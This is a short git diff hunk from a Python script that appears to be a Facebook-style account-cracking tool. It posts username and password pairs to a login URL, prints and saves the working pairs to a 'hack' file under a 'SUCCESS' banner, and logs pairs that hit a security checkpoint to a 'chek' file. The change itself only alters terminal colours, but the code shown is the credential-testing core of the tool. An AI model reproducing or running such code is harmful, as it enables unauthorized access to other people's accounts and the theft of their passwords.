@@ -54,12 +54,12 @@ def request():
 		}
 		r = requests.post(url,headers=headers,data=data)
 		if('home.php?' in r.url or 'free' in r.url):
-			hack1 = '\n\033[1;97m\033[1;44;97m SUCCESS \033[0m\n\033[1;97mUsername : '+id+'\n\033[1;97mPassword : '+pw
+			hack1 = '\n\033[1;97m\033[1;42;97m SUCCESS \033[0m\n\033[1;96mUsername : '+id+'\n\033[1;96mPassword : '+pw
 			print(hack1)
 			hack.write(hack1)
 			os.sys.exit()
 		elif('checkpoint' in r.url):
-			chek1 = '\n\033[1;97m\033[1;41;97m CHEKPOINT \033[0m\n\033[1;97mUsername : '+id+'\n\033[1;97mPassword : '+pw
+			chek1 = '\n\033[1;97m\033[1;41;97m CHEKPOINT \033[0m\n\033[1;91mUsername : '+id+'\n\033[1;91mPassword : '+pw
 			print(chek1)
 			chek.write(chek1)
 			os.sys.exit()
